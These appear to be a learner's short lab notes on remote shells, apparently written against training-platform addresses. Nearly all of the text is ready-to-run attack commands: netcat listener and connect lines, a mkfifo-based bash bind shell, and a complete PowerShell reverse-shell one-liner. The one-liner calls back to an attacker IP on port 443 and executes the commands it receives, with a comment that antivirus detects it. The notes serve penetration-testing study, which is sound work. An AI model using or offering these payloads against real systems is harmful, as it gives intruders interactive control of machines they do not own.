```
$ nc -lvnp 7777
```
%%  Target  server starting Netcat listener %%

```
$ nc -nv 10.129.41.200 7777
```
%% Client - Attack box connecting to target %%

```
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
%%  Server - Binding a Bash shell to the TCP session %%

```
$ nc -nv 10.129.41.200 7777
```
%% connect to the bind bash shell session on server you should get a shell on attack box %%

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
%% powershell cmd to establish reverse shell with attack machine. Detectable by AV %%